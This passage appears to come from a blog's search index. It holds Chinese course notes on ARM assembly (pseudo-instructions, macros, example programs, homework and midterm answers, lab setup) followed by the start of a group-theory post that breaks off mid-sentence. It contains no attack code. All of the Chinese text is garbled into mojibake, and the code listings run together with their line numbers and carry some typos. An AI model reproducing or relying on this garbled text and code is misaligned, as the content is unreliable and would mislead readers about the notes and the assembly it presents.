FALSEï¼ˆå‡ï¼‰ï¼›LCLS å®šä¹‰ä¸€ä¸ªå±€éƒ¨å­—ç¬¦ä¸²å˜é‡ï¼Œå…¶é»˜è®¤åˆå€¼ä¸º ç©ºã€‚ å±€éƒ¨å˜é‡ çš„å˜é‡ååœ¨å˜é‡ä½œç”¨èŒƒå›´å†…å¿…é¡»å…·æœ‰å”¯ä¸€æ€§ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå±€éƒ¨å˜é‡åªåœ¨å®šä¹‰è¯¥å˜é‡çš„ç¨‹åºæ®µå†…æœ‰æ•ˆã€‚ ä¸‰ã€å˜é‡èµ‹å€¼ä¼ªæŒ‡ä»¤ SETAã€SETLå’ŒSETS ä¼ªæŒ‡ä»¤SETAã€SETLå’ŒSETS ç”¨äºç»™ä¸€ä¸ªå·²ç»å®šä¹‰çš„å…¨å±€å˜é‡æˆ–å±€éƒ¨å˜é‡è¿›è¡Œèµ‹å€¼ã€‚ æ³¨ï¼šè¦é¡¶æ ¼å†™ SETAä¼ªæŒ‡ä»¤ç”¨äºç»™ä¸€ä¸ªæ•°å­—å˜é‡èµ‹å€¼ï¼›SETLä¼ªæŒ‡ä»¤ç”¨äºç»™ä¸€ä¸ªé€»è¾‘å˜é‡èµ‹å€¼ï¼›SETSä¼ªæŒ‡ä»¤ç”¨äºç»™ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡èµ‹å€¼ï¼› 1Test1 SETA 0xAA å››ã€å®šä¹‰å¯„å­˜å™¨åˆ—è¡¨ä¼ªæŒ‡ä»¤ æŒ‡ä»¤ LDM/STM éœ€è¦ä½¿ç”¨ä¸€ä¸ªæ¯”è¾ƒé•¿çš„å¯„å­˜å™¨åˆ—è¡¨ï¼Œä½¿ç”¨ä¼ªæŒ‡ä»¤ RLIST å¯å¯¹ä¸€ä¸ªåˆ—è¡¨å®šä¹‰ä¸€ä¸ªç»Ÿä¸€çš„åç§°ã€‚ 123456LoReg RLIST {R0-R7} ï¼›å®šä¹‰å¯„å­˜å™¨åˆ—è¡¨{R0-R7} ï¼›çš„åç§°ä¸ºLoRegSTMFD SP!, LoReg ï¼›å †æ ˆæ“ä½œä½¿ç”¨å¯„å­˜å™¨åˆ—è¡¨RegList RLIST {R0-R5,R8,R10} ï¼›å°†å¯„å­˜å™¨åˆ—è¡¨åç§°å®šä¹‰ ï¼›ä¸ºRegListï¼Œå¯åœ¨ARMæŒ‡ä»¤LDM/STMä¸­ ï¼›é€šè¿‡è¯¥åç§°è®¿é—®å¯„å­˜å™¨åˆ—è¡¨ æ•°æ®å®šä¹‰ä¼ªæŒ‡ä»¤1ã€ LTORG ç”¨äºå£°æ˜ä¸€ä¸ªæ•°æ®ç¼“å†²æ± ï¼ˆæ–‡å­—æ± ï¼‰çš„å¼€å§‹ã€‚ å…¶ç›®çš„æ˜¯ï¼Œé˜²æ­¢åœ¨ç¨‹åºä¸­ä½¿ç”¨LDRä¹‹ç±»çš„æŒ‡ä»¤è®¿é—®æ—¶ï¼Œå¯èƒ½äº§ç”Ÿçš„è¶Šç•Œã€‚ é€šå¸¸æŠŠæ•°æ®ç¼“å†²æ± æ”¾åœ¨ä»£ç æ®µçš„æœ€åé¢ï¼Œæˆ–æ”¾åœ¨æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤æˆ–å­ç¨‹åºè¿”å›æŒ‡ä»¤ä¹‹åï¼Œè¿™æ ·å¤„ç†å™¨å°±ä¸ä¼šé”™è¯¯åœ°å°†æ•°æ®ç¼“å†²æ± ä¸­çš„æ•°æ®å½“ä½œæŒ‡ä»¤æ¥æ‰§è¡Œã€‚ 2ã€MAP å’Œ FIELD MAP ç”¨äºå®šä¹‰ä¸€ä¸ªç»“æ„åŒ–çš„å†…å­˜è¡¨çš„é¦–åœ°å€ã€‚FIELD ä¼ªæŒ‡ä»¤ç”¨äºå®šä¹‰ä¸€ä¸ªç»“æ„åŒ–å†…å­˜è¡¨ä¸­çš„æ•°æ®åŸŸã€‚MAP é€šå¸¸å’Œ FIELD ä¼ªæŒ‡ä»¤ç›¸é…åˆæ¥å®šä¹‰ä¸€ä¸ªç»“æ„åŒ–çš„å†…å­˜è¡¨ã€‚ 3ã€SPACE SPACEä¼ªæŒ‡ä»¤ç”¨äºåˆ†é…ä¸€ç‰‡è¿ç»­çš„å­˜å‚¨åŒºåŸŸå¹¶åˆå§‹åŒ–ä¸º 0 4ã€DCBåˆ†é…å†…å­˜å•å…ƒå¹¶åˆå§‹åŒ– 5ã€DCDå’ŒDCDUåˆ†é…å­˜å‚¨å•å…ƒå¹¶åˆå§‹åŒ– æ§åˆ¶ç¨‹åºæµå‘ä¼ªæŒ‡ä»¤å…¶ä»–ä¼ªæŒ‡ä»¤1ã€å®šä¹‰å¯¹é½æ–¹å¼ä¼ªæŒ‡ä»¤ ALIGN 2ã€æ®µå®šä¹‰ä¼ªæŒ‡ä»¤AREA AREAç”¨äºå®šä¹‰ä¸€ä¸ªä»£ç æ®µæˆ–æ•°æ®æ®µã€‚å¸¸ç”¨çš„å±æ€§å¦‚ä¸‹ï¼š ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åº è‡³å°‘ è¦æœ‰ä¸€ä¸ªä»£ç æ®µã€‚ 3ã€CODE16 å’Œ CODE32 4ã€å®šä¹‰ç¨‹åºå…¥å£ç‚¹ä¼ªæŒ‡ä»¤ ENTRY ä¸€ä¸ªç¨‹åºï¼ˆå¯åŒ…å«å¤šä¸ªæºæ–‡ä»¶ï¼‰ä¸­è‡³å°‘è¦æœ‰ä¸€ä¸ªENTRYï¼ˆå¯ä»¥æœ‰å¤šä¸ªENTRYï¼Œå½“æœ‰å¤šä¸ªENTRYå…¥å£æ—¶ï¼Œç¨‹åºçš„çœŸæ­£å…¥å£ç‚¹ç”±é“¾æ¥å™¨æŒ‡å®šï¼‰ï¼Œä½†ä¸€ä¸ªæºæ–‡ä»¶ä¸­æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªENTRYï¼ˆå¯ä»¥æ²¡æœ‰ENTRYï¼‰ã€‚ 5ã€æ±‡ç¼–ç»“æŸä¼ªæŒ‡ä»¤ END 6ã€å¤–éƒ¨å¯å¼•ç”¨ç¬¦å·å£°æ˜ä¼ªæŒ‡ä»¤ EXPORTï¼ˆæˆ–GLOBALï¼‰ 7ã€IMPORT 8ã€EXTERN 9ã€ç­‰æ•ˆä¼ªæŒ‡ä»¤ EQUï¼ˆ#defineï¼‰ 10ã€GETï¼ˆæˆ–INCLUDEï¼‰ ä¸ARMæŒ‡ä»¤ç›¸å…³çš„å®æŒ‡ä»¤å®1ã€MACRO å’Œ MEND 12345678910MACRO ï¼›å®å®šä¹‰æŒ‡ä»¤$MDATA MAXNUM $NUM1,$NUM2 ï¼›ä¸»æ ‡å·ï¼Œå®åï¼Œå‚æ•°è¯­å¥æ®µ$MDATD.WAY1 ï¼› å®å†…æ ‡å·ï¼Œå¿…é¡»å†™ä¸ºâ€œä¸»æ ‡å·.å®å†…æ ‡å·â€è¯­å¥æ®µ$MDATA.WAY2 ï¼› å®å†…æ ‡å·è¯­å¥æ®µMEND ï¼› å®ç»“æŸæŒ‡ä»¤ä¸»ç¨‹åºä¸­è°ƒç”¨è¯¥å®ï¼šLab1 MAXNUM 0x01, 0x02 2ã€MEXIT MEXIT ç”¨äºä»å®å®šä¹‰ä¸­è·³è½¬å‡ºå»ã€‚ å®æŒ‡ä»¤åœ¨ARMä¸­ï¼Œè¿˜æœ‰ä¸€ç§æ±‡ç¼–å™¨å†…ç½®çš„æ— å‚æ•°å’Œæ ‡å·çš„å®â€”â€”å®æŒ‡ä»¤ã€‚ åœ¨æ±‡ç¼–æ—¶ï¼Œè¿™äº›å®æŒ‡ä»¤è¢«æ›¿æ¢æˆä¸€æ¡æˆ–ä¸¤æ¡çœŸæ­£çš„ARMæˆ– Thumb æŒ‡ä»¤ã€‚ARMå®æŒ‡ä»¤æœ‰å››æ¡ï¼Œåˆ†åˆ«æ˜¯ï¼š â€¢ ADRï¼šå°èŒƒå›´çš„åœ°å€è¯»å–å®æŒ‡ä»¤ï¼› â€¢ ADRLï¼šä¸­ç­‰èŒƒå›´çš„åœ°å€è¯»å–å®æŒ‡ä»¤ï¼› â€¢ LDRï¼šå¤§èŒƒå›´çš„åœ°å€è¯»å–å®æŒ‡ä»¤ï¼› â€¢ NOPï¼šç©ºæ“ä½œå®æŒ‡ä»¤ã€‚ ARMæ±‡ç¼–ç¨‹åºè®¾è®¡æ¨¡æ¿è¦ç‚¹ 123456AREA example,CODE,READONLY;å®šä¹‰ä»£ç æ®µï¼Œä¸€ä¸ªARMæ±‡ç¼–ç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªä»£ç æ®µENTRY ;å®šä¹‰ç¨‹åºå…¥å£ç‚¹â€¦â€¦â€¦â€¦END ;æ±‡ç¼–è¯­è¨€ç¨‹åºç»“æŸ ä¾‹é¢˜ï¼š è¯¥ç¨‹åºæ‰§è¡Œåï¼š 1234567891011121314 AREA blockcopy,CODE,READONLY ENTRY LDR R1,=ftt ;å°†ç¬¦å·fttçš„åœ°å€åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­ã€‚ LDR R2,=ftt2 LDR R3,[R1] LDR R4,[R2] LDR R5,[R1, #4] LDR R6,[R2, #4] Src DCD 1,2,3,4,5,6,7,8,1,2,3,4,5,6,7,8,1,2,3,4StrMem DCB â€œABCSâ€,0 MAP Srcftt FIELD 8ftt2 FIELD 8 END R3= 1 ï¼ŒR4= 3 ï¼ŒR5= 2 ï¼ŒR6= 4 æœ¬é—¨è¯¾ä¸­ï¼ˆåŒ…æ‹¬è€ƒè¯•å’Œä½œä¸šï¼‰å¦‚æœæ²¡æœ‰ç‰¹æ®Šè¯´æ˜ï¼Œå­˜å‚¨æ–¹å¼å‡é»˜è®¤ä¸ºå°ç«¯æ¨¡å¼ 1234567891011 AREA blockcopy,CODE,READONLY ENTRY ARM LDR R0,=ss1 LDR R1,=ss2 LDR R4,[R0] ALIGN 4ss1 DCB 1 ALIGN 4,3 ss2 DCB 3 END è¯¥æ®µç¨‹åºæ‰§è¡Œå®Œæˆåï¼Œå‡å¦‚R0çš„å€¼ä¸º0x10001000ï¼Œåˆ™R1=0x10001003 ï¼ŒR4=0x03000001 ä½œä¸šé¢˜ï¼š å…­ã€åœ¨åˆ—è¡¨ä¸­æŸ¥æ‰¾æŒ‡å®šçš„æ•°æ® è¦æ±‚å¦‚ä¸‹ï¼š (1) å®šä¹‰ä¸€ä¸ªå­˜å‚¨å•å…ƒé¦–åœ°å€åä¸º Start çš„æ•°æ®åˆ—è¡¨ï¼Œè¯¥æ•°æ®åˆ—è¡¨åŒ…å« 5 ä¸ªå­—å­˜å‚¨å•å…ƒã€‚ç¬¬ä¸€ä¸ªå•å…ƒæ˜¯åˆ—è¡¨ä¸­æ•°æ®çš„æ•°é‡ï¼Œå…¶å€¼ä¸º 4ï¼Œå³åˆ—è¡¨ä¸­åŒ…å« 4 ä¸ªæ•°æ®ã€‚åé¢å››ä¸ªå•å…ƒå­˜å‚¨çš„æ˜¯åˆ—è¡¨ä¸­çš„ 4 ä¸ªæ•°æ®ï¼š0x0138A, 0x0A21DC, 0x1F5376, 0x9018613ã€‚ (2) å®šä¹‰ä¸€ä¸ªåä¸º NewItem çš„å­—å­˜å‚¨å•å…ƒï¼Œè¯¥å•å…ƒä¸­åŒ…å«è¦æŸ¥æ‰¾çš„æ•°æ®ï¼Œè¯¥ä¾‹è¦æ±‚æ˜¯0x1F5376 (3) è¦æ±‚ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œåœ¨ Start æ•°æ®åˆ—è¡¨ä¸­æŸ¥æ‰¾æ˜¯å¦åŒ…å« NewItem å•å…ƒä¸­çš„æ•°æ®ã€‚å¦‚æœåŒ…å«åˆ™æŠŠè¯¥æ•°æ®åœ¨åˆ—è¡¨ä¸­çš„ä½ç½®åºå·ï¼ˆ1ã€2ã€3ã€4ï¼‰å­˜å‚¨åˆ° Index å­—å­˜å‚¨å•å…ƒä¸­ã€‚å¦åˆ™åœ¨Index å­—å­˜å‚¨å•å…ƒä¸­å­˜å‚¨ 0xFFFFFFFFã€‚ (4) è¦æ±‚ Start çš„æ•°æ®åˆ—è¡¨å’Œ NewItem çš„å­—å­˜å‚¨å•å…ƒå®šä¹‰åœ¨ä»£ç æ®µä¸­ï¼ˆåªè¯»çš„ ROM åŒºï¼‰ï¼Œè€Œ Index å­—å­˜å‚¨å•å…ƒè¦å®šä¹‰åœ¨ä¸€ä¸ªåä¸º mydata çš„æ•°æ®æ®µä¸­ï¼ˆå¯è¯»å†™çš„ RAM åŒºï¼‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738 AREA myprog, CODE, REDFONLY ENTRYMain LDR R0, =Start ; R0 = Start çš„åœ°å€ LDR R1, NewItem ; R1 = NewItem çš„å€¼ LDR R3, Start ; R3 = Start çš„ç¬¬ä¸€ä¸ªå€¼ CMP R3, #0 ; æ£€æŸ¥ R3 æ˜¯å¦ä¸º 0 BEQ Missing ; å¦‚æœ R3 = 0ï¼Œè·³è½¬åˆ° Missing LDR R4, [R0, #4]! ; R4 = Start[1]ï¼ŒR0 å¢åŠ  4 MOV R2, #1 ; R2 = 1ï¼ˆç´¢å¼•ï¼‰Loop CMP R1, R4 ; æ¯”è¾ƒ R1 å’Œ R4 BEQ Done ; å¦‚æœç›¸ç­‰ï¼Œè·³è½¬åˆ° Done SUBS R3, R3, #1 ; R3 -= 1ï¼ˆè®¡æ•°å™¨ï¼‰ LDR R4, [R0, #4]! ; R4 = ä¸‹ä¸€ä¸ªå…ƒç´ ï¼ŒR0 å¢åŠ  4 ADD R2, #1 ; R2 += 1ï¼ˆç´¢å¼•ï¼‰ BNE Loop ; å¦‚æœ R3 != 0ï¼Œç»§ç»­å¾ªç¯ Missing MOV R2, #0xFFFFFFFF Done LDR R5, =Index ; R5 = Index çš„åœ°å€ STR R2, [R5] ; å­˜å‚¨ R2 åˆ° Index SWI 0x11 ; é€€å‡ºç¨‹åºStart DCD 0x4, 0x0138A, 0x0A21DC, 0x1F5376, 0x9018613]NewItem DCD 0x1F5376 AREA mydata, NOINIT MAP 0x40000000Index FIELD 4 END ä¹ã€è¯•æŠŠå¦‚ä¸‹ C å‡½æ•°æ”¹å†™æˆ ARMæŒ‡ä»¤å‡½æ•°ã€‚ 123int subxx(int x, int y) { return x - y;} æ”¹å†™ä¸ºï¼š 123456 AREA TT, CODE, READONLY EXPORT subxxsubxx SUBS R0, R0, R1 MOV PC, LR END åã€æŠŠä¸‹é¢çš„ ARM æŒ‡ä»¤å‡½æ•°æ”¹å†™æˆ C è¯­è¨€å‡½æ•°ã€‚ 123456789 AREA tt, CODE, READONLY EXPORT strcopystrcopy LDRB R2, [R1], #1 STRB R2, [R0], #1 ;å°† R2 ä¸­çš„å­—èŠ‚å†™å…¥ R0 æŒ‡å‘çš„å†…å­˜åœ°å€ã€‚ CMP R2, #0 BNE strcopy MOV PC, LR END ç­‰æ•ˆäº 12345678void strcopy(char *d, char *s) { while (*s != '\\0') { *d = *s; d = d + 1; s = s + 1; } *d = *s;} æœŸä¸­è€ƒè¯•åˆ¤æ–­å¯¹é”™é¢˜ï¼ˆ30åˆ†ï¼‰ ç²¾ç®€æŒ‡ä»¤é›†RISCç›¸å¯¹å¤æ‚æŒ‡ä»Šé›†CISC,å…·æœ‰æ›´å°‘çš„æŒ‡ä»¤ï¼ŒæŒ‡ä»¤å®ç°çš„åŠŸèƒ½æ›´ç®€å•ï¼Œå› æ­¤å®ç°åŒæ ·ä¸€ä¸ªå¤æ‚åŠŸèƒ½ï¼Œé‡‡ç”¨RISCæŒ‡ä»¤ç¼–å†™çš„ç¨‹åºæ¯”é‡‡ç”¨C1SCæŒ‡ä»¤åå†™çš„ç¨‹åºå…·æœ‰æ›´å°‘çš„ä»£ç é‡ã€‚(8åˆ†) é”™è¯¯ å®æ—¶æ“ä½œç³»ç»Ÿä¸­çš„ä»»åŠ¡çš„ç¡…èµ·æ€æ˜¯æŒ‡ä»»åŠ¡è¿›å…¥ä»»åŠ¡ç­‰å¾…é˜Ÿåˆ—ï¼Œç­‰å¾…é€šè¿‡è°ƒåº¦è½¬ä¸ºè¿è¡ŒçŠ¶æ€ã€‚ï¼ˆ5åˆ†ï¼‰é”™è¯¯ ARMä½“ç³»ç»“æ„ä¸çº¯ç²¹çš„RISCä½“ç³»ç»“æ„ä¸å®Œå…¨ç›¸åŒã€‚(12åˆ†) æ­£ç¡® åœ¨ ARM çŠ¶æ€ä¸‹ï¼Œ ä»»ä¸€æ—¶åˆ»éƒ½å¯ä»¥è®¿é—®åˆ° 16 ä¸ªé€šç”¨å¯„å­˜å™¨å’Œ 2 ä¸ªçŠ¶æ€å¯„å­˜å™¨ã€‚(5 åˆ†) é”™è¯¯ é˜…è¯»ç¨‹åºå¹¶å¡«ç©ºé¢˜ï¼ˆ39åˆ†ï¼‰ï¼ˆæ³¨ï¼šå‡è®¾ RAM åŒºå­˜å‚¨å•å…ƒä¸Šç”µåç¼ºçœå€¼éƒ½ä¸º 0ï¼‰ 1ã€é˜…è¯»ç¨‹åºï¼Œå¹¶æ ¹æ®è¦æ±‚å¡«ç©ºã€‚ 12345678910111213141516171819202122232425262728293031323334353637AREA myprog, CODE, READONLYLDR R0, =MyDataLDR R1, =Des_RAMSTRB R4, [R3,#-1]LDR R4, [R1]BLDR R2, =FLD2LDR R3, =FLD_CSUB R6, R2, R0SUB R7, R3, R1LDR R4, [R2,#4]STR R4, [R3,#-4]!SUB R8, R2, R0SUB R9, R3, R1LDR R4, [R2],#-4STR R4, [R3,#-4]!MOV R12, #4LDR R4, [R0,R12,LSL #02]STR R4, [R3,#-4]MOV R12, #5LDRB R4, [R0,R12,LSL #02]MyData DCD 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xA, 0xB,DCD 0xC,0xD, 0xE, 0xFMAP MyDataFLD1 FIELD 4FLD2 FIELD 8FLD3 FIELD 8AREA mydata, DATA, READWRITEDes_RAM SPACE 40MAP Des_RAMFLD_A FIELD 4FLD_B FIELD 8FLD_C FIELD 8END ä¸Šè¿°ç¨‹åºæ‰§è¡Œåï¼Œä¸‹åˆ—å„å¯„å­˜å™¨çš„å€¼åˆ†åˆ«æ˜¯å¤šå°‘ï¼ŸR6 = 4ï¼ŒR7 = 12ï¼ŒR8 = 4ï¼ŒR9 = 8ã€‚ ä» Des_RAM åœ°å€å¼€å§‹çš„è¿ç»­ 3 ä¸ªå­—å•å…ƒçš„å†…å®¹æ˜¯ï¼š0x6000005ï¼Œ2ï¼Œ3ã€‚ 2ã€é˜…è¯»ç¨‹åºï¼Œå¹¶æ ¹æ®è¦æ±‚å¡«ç©ºã€‚ 123456789101112131415161718192021222324252627 GBLA Len GBLS StrA GBLS StrB GBLS StrC GBLL VLStrA SETS &quot;My String!&quot;VL SETL {True}StrB SETS :STR: 0x12345678StrC SETS StrA :CC: StrB :RIGHT: 3Len SETA :LEN: StrCDAdr EQU DataA AREA mycode, CODE, READONLY ENTRY LDR R0, =DAdr ADRR1, StrS1 LDR R2, =StrS2 LDR R3, =DataB LDRB R4,[R0] LDR R5, =Len MOV R6, #?StrS2End1 B End1DataA DCD 0x11223344StrS1 DCB StrB,0 ALIGN 4StrS2 DCB &quot;$StrC$VL$Len&quot;,0DataB DCD 0x01 END å‡è®¾ä¸Šè¿°ç¨‹åºæ‰§è¡Œåï¼Œå¯„å­˜å™¨ R0 çš„å€¼ä¸ºï¼š0x20ï¼Œåˆ™ä¸‹åˆ—å„å¯„å­˜å™¨çš„å€¼åˆ†åˆ«æ˜¯å¤šå°‘ï¼Ÿ R1 = 36ï¼ŒR2 = 48ï¼ŒR3 = 64ï¼ŒR4 = 68ï¼ŒR5 = 3ã€‚ èµ·å§‹åœ°å€ä¸º Str52 çš„è¿ç»­å†…å­˜å•å…ƒä¸­ï¼Œæ‰€å­˜æ”¾çš„å­—ç¬¦ä¸²ä¸ºï¼ˆæ³¨ï¼šè¯¥å­—ç¬¦ä¸²ä»¥ 0 ä¸ºç»“æŸæ ‡è®°ï¼‰ï¼š678T00000003ã€‚ ç¼–ç¨‹é¢˜ï¼ˆ31åˆ†ï¼‰å‡è®¾ç³»ç»Ÿé‡‡ç”¨S3C2440å¤„ç†å™¨ï¼Œè¦æ±‚å®ç°Cè¯­è¨€å’Œæ±‡ç¼–è¯­è¨€çš„æ··åˆç¼–ç¨‹ã€‚ ï¼ˆ1ï¼‰ä½¿ç”¨æ±‡ç¼–è¯­è¨€å®ç°ä¸€ä¸ªåä¸º MYFUN çš„å­ç¨‹åºï¼š è¯¥å‡½æ•°æœ‰4ä¸ªè¾“å…¥çš„intç±»å‹å‚æ•° åœ¨è¯¥æ±‡ç¼–å­ç¨‹åºä¸­è°ƒç”¨Cå‡½æ•°cg()ï¼Œä»¥å®ç°ä¸‹é¢çš„åŠŸèƒ½ï¼šint MYFUN(int a, int b, int c, int d) {return -cg(c,d,a,b,a+c,b+d)} åœ¨Cè¯­è¨€çš„mainå‡½æ•°ä¸­è°ƒç”¨è¯¥æ±‡ç¼–MYFUNå‡½æ•°ã€‚æ³¨ï¼šæ±‡ç¼–æ‰€éœ€çš„å¯åŠ¨ä»£ç ä¸ç”¨ç¼–å†™ï¼Œåªéœ€è¦ç¼–å†™MYFUNå‡½æ•°å®ç°éƒ¨åˆ†ï¼Œå‡è®¾è¯¥MYFUNå‡½æ•°åœ¨ä¸€ä¸ªåä¸ºARMcode.sçš„æ±‡ç¼–æºç¨‹åºä¸­å®ç°ã€‚ARMcode.séœ€è¦åŒ…å«å®Œæ•´æ±‡ç¼–ç¨‹åºç»“æ„ï¼Œéœ€è¦ä¿æŠ¤å’Œæ¢å¤ç°åœºã€‚ï¼ˆ18åˆ†ï¼‰ ï¼ˆ2ï¼‰ç¼–å†™å®Œæ•´çš„Cè¯­è¨€ç¨‹åºï¼š ä½¿ç”¨åµŒå…¥å¼æ±‡ç¼–æ–¹å¼ï¼Œç¼–å†™int FunXY(int x, int y)ï¼Œè¦æ±‚æ‰§è¡Œï¼š æŠŠå‚æ•° x æŒ‰ä½å–ååï¼Œå†è¿›è¡Œå¾ªç¯å³ç§»6ä½çš„æ“ä½œï¼Œå¾—åˆ°ä¸­é—´ç»“æœaï¼Œ æŠŠå‚æ•° y å–ç»å¯¹å€¼åï¼Œå†ä¸aè¿›è¡Œé€»è¾‘å¼‚æˆ–æ“ä½œã€‚å…¶ç»“æœä½œä¸ºå‡½æ•°çš„è¿”å›å€¼è¿”å›ã€‚ åœ¨ C è¯­è¨€çš„ main å‡½æ•°ä¸­è°ƒç”¨æ±‡ç¼–å‡½æ•° MYFUNï¼Œè¾“å…¥çš„å‚æ•°åˆ†åˆ«ä¸º 14ï¼Œ25ï¼Œ38ï¼Œ49ã€‚ åœ¨ C è¯­è¨€ç¨‹åºçš„ main å‡½æ•°ä¸­ï¼Œç¼–å†™ä¸€æ®µä»£ç ï¼Œç”¨äºåˆ¤æ–­å½“å‰ CPU çš„å·¥ä½œçŠ¶æ€æ˜¯ ARM æ€è¿˜æ˜¯ Thumb æ€ã€‚å¦‚æœæ˜¯ ARM æ€ï¼Œåˆ™æŠŠå˜é‡ Tflag è®¾ç½®ä¸º 1ï¼Œå¦åˆ™æŠŠå˜é‡ Tflag è®¾ç½®ä¸º 0ã€‚ åœ¨ C è¯­è¨€ç¨‹åºçš„ main å‡½æ•°ä¸­è°ƒç”¨å‡½æ•° FunXYï¼Œå‡½æ•°çš„è¾“å…¥å‚æ•°ä¸ºï¼š0x12345678 å’Œ -2ã€‚ ï¼ˆ3ï¼‰æ³¨æ„ï¼šè¦éµå®ˆ ATPCS è§„èŒƒï¼Œç¨‹åºç»“æ„è¦å®Œæ•´ã€‚ 1234int cg(int a1, int a2, int a3, inta4, int a5, int a6) { return (a1+a2+a3+a4)*a5-a6;}int Tflag; å®éªŒä¸€ æŒ‡ä»¤ç³»ç»ŸåŠå¯»å€æ–¹å¼ æ­å»ºå®éªŒç¯å¢ƒ å®‰è£… MDK Keil uVision5 åŠ MDK79525(MDK5-ARM9 æ”¯æŒåŒ…)ï¼Œå­¦ä¼šåœ¨ Keil ä¸­ç¼–ç¨‹ ARM æ±‡ç¼–ä»£ç æ–‡ä»¶ï¼ŒæŒæ¡ rebuild å’Œ debug ç­‰åŸºæœ¬æ“ä½œã€‚ å®éªŒå†…å®¹ å¯¹40å¤šæ¡å¸¸ç”¨çš„æŒ‡ä»¤ï¼Œä½¿ç”¨ä¸åŒçš„å¯»å€æ–¹å¼è¿›è¡Œæµ‹è¯•ï¼Œå¹¶é€šè¿‡æŸ¥çœ‹å¯„å­˜å™¨ã€å­˜å‚¨å™¨ã€ç¨‹åºçŠ¶æ€å¯„å­˜å™¨çš„å†…å®¹ï¼Œæ£€æŸ¥æ˜¯å¦ä¸æœŸæœ›ä¸€è‡´ã€‚","link":"/2025/04/14/ARM-%E5%A4%84%E7%90%86%E5%99%A8/"},{"title":"Group Theory","text":"ä¼šæ•°å­¦åˆ°åº•æ˜¯ä»€ä¹ˆæ„Ÿè§‰ï¼ŸğŸ§ç¾¤è®ºå…¥é—¨ã€‚ ç¾¤æ˜¯ä»»æ„æ•°å­¦å¯¹è±¡ï¼ˆå­—æ¯ã€æ•°å­—ã€å‡½æ•°ã€çŸ©é˜µç­‰ï¼‰ç»„æˆçš„é›†åˆå†åŠ ä¸Šä¸€ç§è¿ç®—ï¼Œæ»¡è¶³ä»¥ä¸‹å››æ¡æ€§è´¨ã€‚ Closureï¼ˆå°é—­æ€§ï¼‰ï¼š$a\\circ b=c$ã€‚é›†åˆä¸­çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ è¿ç®—ä»åœ¨é›†åˆä¸­ã€‚ Associativityï¼ˆç»“åˆæ€§ï¼‰ï¼š$(a\\circ b)\\circ c=a\\circ (b\\circ c)$ã€‚ Indentity/Neutralï¼ˆå•ä½å…ƒ/ä¸­æ€§å…ƒï¼‰ï¼š$a\\circ e=a$ã€‚ Inverseï¼ˆé€†å…ƒï¼‰ï¼š$a\\circ a^{-1}=e$ã€‚ç¾¤ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å­˜åœ¨é€†å…ƒã€‚ Integersï¼šæ•´æ•°é›†$\\mathbb{Z}$ä¸Šçš„åŠ æ³•è¿ç®—æ„æˆäº†ä¸€ä¸ªç¾¤ã€‚å•ä½å…ƒä¸º 0ï¼Œç›¸åæ•°å³ä¸ºé€†å…ƒï¼› Rationalsï¼šæœ‰ç†æ•°é›†$\\mathbb{Q}/0$ä¸Šçš„ä¹˜æ³•è¿ç®—ä¹Ÿæ„æˆäº†ä¸€ä¸ªç¾¤ã€‚å•ä½å…ƒä¸º 1ï¼Œå€’æ•°å³ä¸ºé€†å…ƒã€‚ ä½ å¯èƒ½æ„è¯†åˆ°æœ‰ç†æ•°é›†ä¸Šçš„åŠ æ³•è¿ç®—ä¹Ÿæ„æˆä¸€ä¸ªç¾¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ç¬¦å·$Q^+$å’Œ$Q^Ã—$ã€‚ ä¸€ä¸ªç¾¤ä¸­çš„å…ƒç´ ä¸ªæ•°ç§°ä¸ºç¾¤çš„é˜¶ï¼Œ$|Z|=|Q^+|=|Q^Ã—|=\\infty$ã€‚ è¯·æ³¨æ„ï¼Œå°½ç®¡åŠ æ³•å’Œä¹˜æ³•éƒ½å…·å¤‡äº¤æ¢æ€§ï¼Œä½†å¹¶æ²¡æœ‰ä»»ä½• RULE è§„å®šç¾¤ä¸­çš„å…ƒç´ å¿…é¡»å¯äº¤æ¢ã€‚ ç”±äºâ€”â€”$$e_L\\circ x=x,\\ e_L\\circ e_R=e_R\\ \\ \\ (*);\\x\\circ e_R=x,\\ e_L\\circ e_R=e_L\\ \\ \\ (**);\\\\therefore e_L=e_R\\ \\ \\ \\Box$$ äºæ˜¯æˆ‘ä»¬è¯æ˜äº†Left Identity = Right Identityã€‚$$\\because (a^{-1})^{-1}=e\\circ(a^{-1})^{-1}=a\\circ (a^{-1}\\circ (a^{-1})^{-1})=a\\circ e=a$$ $$\\therefore a^{-1}\\circ a=a^{-1}\\circ (a^{-1})^{-1}=e$$ äºæ˜¯æˆ‘ä»¬è¯æ˜äº†Left Inverse = Right Inverseã€‚ ç¾¤è®ºä¸­æœ‰å¾ˆå¤šåè¯æ³•çš„ä½¿ç”¨ã€‚ä¾‹å¦‚ è¯æ˜ç¾¤ä¸­çš„å•ä½å…ƒå”¯ä¸€ï¼šå‡è®¾æœ‰$e_1$å’Œ$e_2$ï¼Œåˆ™$e_1=e_1\\circ e_2=e_2$ã€‚ è¯æ˜ç¾¤ä¸­å…ƒç´ çš„é€†å…ƒå”¯ä¸€ï¼šå‡è®¾æœ‰$a_1$å’Œ$a_2$ï¼Œåˆ™$a_1=(a_2\\circ a)\\circ a_1=a_2\\circ e=a_2$ã€‚ Finite GroupCyclic $\\mathbb{Z}_n$è¡¨ç¤º$n$é˜¶æ•´æ•°å¾ªç¯ç¾¤ï¼Œ$|\\mathbb{Z}_n|=n$ã€‚æ¯”å¦‚æ¨¡ 6 åŒä½™ç¾¤$|\\mathbb{Z}_6|=6$ ä¸­ä»…æœ‰å…ƒç´  0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ã€‚ Dihedral Groupï¼šæˆ‘ä»¬ç 